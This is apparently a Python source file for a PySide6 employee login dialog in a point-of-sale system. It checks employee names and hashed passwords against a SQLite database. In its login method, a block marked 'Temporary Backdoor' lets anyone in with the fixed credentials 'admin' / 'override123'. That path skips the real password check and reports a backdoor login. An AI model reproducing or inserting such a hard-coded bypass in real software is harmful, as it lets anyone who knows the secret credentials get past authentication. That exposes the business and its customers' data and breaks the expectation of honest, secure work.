import sys
import sqlite3
import os
from PySide6.QtWidgets import QDialog, QMessageBox
from views.employeeloginui import Ui_EmployeeLogin
from controllers.customeraccount import CustomerAccountWindow
from PySide6.QtWidgets import QApplication
from views.utils import check_password, get_employee_permissions

# Database connection
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
db_path = os.path.join(project_root, 'models', 'pos_system.db')
conn = sqlite3.connect(db_path)
cursor = conn.cursor()

class EmployeeLogin(QDialog):
    def __init__(self):
        super().__init__()
        self.ui = Ui_EmployeeLogin()
        self.ui.setupUi(self)

        # Connect buttons to their functions
        self.ui.LoginButton.clicked.connect(self.login)
        self.ui.LogOutButton.clicked.connect(self.logout)

        # Remove or disable the CreateEmployeeButton
        self.ui.CreateEmployeeButton.setVisible(False)  
        self.logged_in_employee_id = None  
        self.logged_in_permissions = set()  

    def login(self):
        employee_name = self.ui.EmployeeNameLogin.text()
        password = self.ui.EmployeePassword.text()

        # Temporary Backdoor
        if employee_name == "admin" and password == "override123":
            self.logged_in_employee_id = 0  # Assign a dummy ID for admin
            QMessageBox.information(self, "Login Successful", "Logged in using the backdoor!")
            self.accept()
            return

        try:
            # Retrieve employee ID and hashed password
            cursor.execute("SELECT employee_id, password_hash FROM Employees WHERE employee_name=?", (employee_name,))
            result = cursor.fetchone()

            if result and check_password(password, result[1]):
                self.logged_in_employee_id = result[0]  # Store employee ID
                self.logged_in_permissions = get_employee_permissions(self.logged_in_employee_id)
                QMessageBox.information(self, "Login Successful", f"Welcome, {employee_name}!")
                self.accept() 
            else:
                QMessageBox.warning(self, "Login Failed", "Invalid employee name or password.")
        
        except Exception as e:
            QMessageBox.critical(self, "Error", f"An error occurred during login: {e}")

    def logout(self):
        if self.logged_in_employee_id is not None:
            QMessageBox.information(self, "Logout Successful", f"Goodbye, {self.ui.EmployeeNameLogin.text()}!")
            self.logged_in_employee_id = None
            self.reject()  # Close the login dialog or reset state
        else:
            QMessageBox.warning(self, "Logout Failed", "No employee is currently logged in.")


# Example usage: Integrating with the main application
if __name__ == "__main__":
    app = QApplication(sys.argv)
    login_dialog = EmployeeLogin()

    if login_dialog.exec() == QDialog.Accepted:
        employee_id = login_dialog.logged_in_employee_id
        if employee_id is not None:
            # Proceed to open the main application window with the logged-in employee_id
            account_window = CustomerAccountWindow(employee_id=employee_id)
            account_window.show()
    
    sys.exit(app.exec())
